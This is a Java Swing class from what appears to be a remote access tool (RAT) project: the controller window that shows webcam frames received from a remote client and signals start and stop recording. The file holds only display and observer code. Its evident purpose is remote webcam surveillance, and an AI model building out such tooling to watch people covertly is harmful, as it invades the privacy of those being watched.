package rat.master.gui.frames;


import rat.packets.WebcamDataPacket;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class RemoteWebcamGUI extends JFrame {

    private static int frameCount;
    private int frameId = ++frameCount;

    private int webcamJobId; // given by client

    private List<RemoteWebcamGUIObserver> observerList = new ArrayList<>();

    private JPanel imagePanel = new JPanel();


    public RemoteWebcamGUI() {
        setLocationRelativeTo(null);
        setMinimumSize(new Dimension(300, 300));
        initGUI();
    }


    private void initGUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        setContentPane(mainPanel);

        mainPanel.add(imagePanel, BorderLayout.CENTER);
    }

    public void displayImagePacket(WebcamDataPacket imgPacket) {
        byte[] screenshotBytes = imgPacket.getImageData();
        ByteArrayInputStream inb = new ByteArrayInputStream(screenshotBytes);
        Graphics gb = imagePanel.getGraphics();

        try {
            BufferedImage buffimg = ImageIO.read(inb);
            gb.drawImage(buffimg, 0, 0, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void register(RemoteWebcamGUIObserver observer) {
        if (!observerList.contains(Objects.requireNonNull(observer))) {
            observerList.add(Objects.requireNonNull(observer));
        }
    }

    public void unregister(RemoteWebcamGUIObserver observer) {
        observerList.remove(observer);
    }

    public int getFrameId() {
        return frameId;
    }

    public int getWebcamJobId() {
        return webcamJobId;
    }

    public void setWebcamJobId(int webcamJobId) {
        this.webcamJobId = webcamJobId;
    }

//    private void notifyCharacteristicsChanged() {
//        List<RemoteWebcamGUIObserver> tmp = new ArrayList<>(observerList);
//        for (RemoteWebcamGUIObserver observer : tmp) {
//            observer.settingsUpdated(framesPerSecond.getValue(), imagePanel.getWidth(), imagePanel.getHeight());
//        }
//    }

//    public void updateWebcamList(String[] deviceNames) {
//        // TODO: finish this
//        startWebcamRecord(deviceNames[0]);
//    }

    private void startWebcamRecord(String deviceName) {
        List<RemoteWebcamGUIObserver> tmp = new ArrayList<>(observerList);
        for (RemoteWebcamGUIObserver observer : tmp) {
            observer.startWebcamRecord(frameId, deviceName);
        }
    }

    private void stopWebcamRecord() {
        List<RemoteWebcamGUIObserver> tmp = new ArrayList<>(observerList);
        for (RemoteWebcamGUIObserver observer : tmp) {
            observer.stopWebcamRecord(frameId);
        }
    }
}
